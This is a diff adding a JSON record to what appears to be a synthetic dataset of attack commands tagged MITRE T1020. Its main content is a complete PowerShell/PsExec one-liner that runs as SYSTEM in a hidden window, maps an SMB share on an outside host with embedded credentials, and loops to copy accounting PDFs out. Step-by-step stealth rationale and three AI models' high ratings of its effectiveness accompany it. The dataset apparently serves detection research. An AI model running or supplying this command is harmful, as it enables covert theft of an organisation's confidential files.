@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; cmd.exe /c 'net use \\\\203.0.113.99\\share /user:svc_user P@ssw0rd /persistent:yes' >$null 2>&1; $sent='C:\\ProgramData\\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; while ($true){ Get-ChildItem 'C:\\Accounting' -Filter *.pdf -Recurse -File | ForEach-Object { Copy-Item -Path $_.FullName -Destination '\\\\203.0.113.99\\share' -Force -ErrorAction SilentlyContinue; if ($?) { Move-Item -Force $_.FullName (Join-Path $sent $_.Name) } }; Start-Sleep 600 }\"",
+  "explanation": "Mounts an external SMB share with credentials and continuously copies targeted PDFs to it, moving files after transfer to avoid duplicates.",
+  "rationale_steps": [
+    "Use PSExec to execute as SYSTEM and hide activity.",
+    "Persistently map an SMB share using provided credentials.",
+    "Recursively copy accounting PDFs to the remote share.",
+    "Move items to a sent folder upon successful copy to prevent re-sends.",
+    "Loop with delays for automated, low-noise exfiltration."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-a75c2fbe",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and braces with valid PsExec flags, PowerShell syntax, and redirection/operators make the command well-formed and parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "It automates exfiltration of PDFs to an external SMB share with looping, error suppression, and post-transfer moves, but using PsExec -s requires administrative privileges (contradicting 'Privilege: None') and external SMB reachability may be constrained.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T04:13:12.074392Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct PowerShell syntax including error handling and redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by establishing persistence, continuously monitoring for PDF files, exfiltrating them to an external SMB share, and tracking transferred files to avoid duplicates - all core elements of T1020.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T05:58:36.618454Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags for psexec and PowerShell, and correct cmdlet usage within the script block.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of automated exfiltration by persistently mounting an SMB share, continuously searching for and copying targeted files, and moving them after successful transfer to prevent re-exfiltration, all in a stealthy manner.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:58:51.554329Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
